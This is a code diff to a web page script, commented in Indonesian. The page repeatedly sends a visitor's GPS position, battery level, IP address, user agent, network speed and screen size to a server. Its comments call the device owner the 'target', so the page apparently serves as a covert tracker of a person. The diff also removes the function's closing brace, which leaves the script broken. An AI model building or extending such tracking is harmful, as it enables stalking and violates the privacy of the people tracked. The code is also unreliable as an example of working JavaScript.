@@ -58,11 +58,21 @@ async function kirimLokasi() {
 
     log.textContent = "Mengambil lokasi...";
 
-    navigator.geolocation.getCurrentPosition(
+        navigator.geolocation.getCurrentPosition(
         async pos => {
             const { latitude, longitude, accuracy, speed, heading } = pos.coords;
             const battery = await getBattery();
 
+            // 📶 SENSOR BARU 1: Mendeteksi jenis & kecepatan jaringan internet
+            let networkData = "Tidak diketahui";
+            if (navigator.connection) {
+                networkData = `${navigator.connection.type || 'Seluler/WiFi'} (Est. ${navigator.connection.downlink} Mbps)`;
+            }
+
+            // 📱 SENSOR BARU 2: Mendeteksi resolusi ukuran layar HP target
+            const screenData = `${window.screen.width}x${window.screen.height}`;
+
+            // Menggabungkan semua data ke dalam satu paket
             const data = {
                 lat: latitude,
                 lon: longitude,
@@ -70,25 +80,27 @@ async function kirimLokasi() {
                 speed: speed || null,
                 direction: heading || null,
                 battery: battery,
+                network: networkData, // Dikirim ke server
+                screen: screenData,   // Dikirim ke server
+                device: navigator.userAgent, // Detail spesifikasi OS & Browser
                 ip: ipAddress,
                 timestamp: new Date().toISOString()
             };
 
-            log.textContent += `\nLokasi: ${latitude}, ${longitude}`;
+            log.textContent = `\nLokasi: ${latitude}, ${longitude}`;
             kirim(data);
         },
         err => {
-            log.textContent += "\nGagal: " + err.message;
+            log.textContent = "\nGagal: " + err.message;
         },
         { enableHighAccuracy: true, timeout: 15000 }
     );
-}
 
 // Kirim lokasi pertama saat halaman dibuka
 kirimLokasi();
 
-// Kirim ulang setiap 10 detik
-setInterval(kirimLokasi, 10000);
+// Kirim ulang setiap 1 menit
+setInterval(kirimLokasi, 60000);
 </script>
 </body>
 </html>
